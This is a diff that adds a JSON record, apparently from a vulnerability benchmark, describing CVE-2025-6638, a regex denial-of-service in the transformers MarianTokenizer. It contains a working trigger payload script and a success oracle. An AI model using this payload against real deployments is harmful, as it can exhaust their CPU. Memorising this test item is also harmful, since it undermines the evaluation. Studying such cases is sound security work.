@@ -1,0 +1,15 @@
+{
+  "file_id": "86_transformers_huntr_6a6c933f-9ce8-4ded-8b3b-2c1444c61f36",
+  "numeric_id": "86",
+  "library_hint": "transformers",
+  "source": "huntr",
+  "title": "Inefficient regular expression in MarianTokenizer.remove_language_code causes ReDoS via catastrophic backtracking",
+  "cve": "CVE-2025-6638",
+  "cwe": "CWE-1333: Inefficient Regular Expression Complexity",
+  "library": "transformers",
+  "affected_version": "< 4.53.0",
+  "vulnerable_function": "MarianTokenizer.remove_language_code",
+  "triggerability": "indirect",
+  "trigger_payload": "from transformers import MarianTokenizer\nimport time\nmodel_name = 'Helsinki-NLP/opus-mt-en-fr'\ntokenizer = MarianTokenizer.from_pretrained(model_name)\nfor i in range(1, 100000, 10000):\n    payload = '<>>\\x00' * i + '<\\n>>><<'\n    start = time.perf_counter()\n    tokenizer.remove_language_code(payload)\n    end = time.perf_counter()\n    execution_time = end - start\n    print(f'Payload length {i}, execution time: {execution_time:.4f} seconds')",
+  "oracle": "Non-linear increase in execution time with input length, demonstrating excessive CPU consumption due to catastrophic backtracking in the regex"
+}
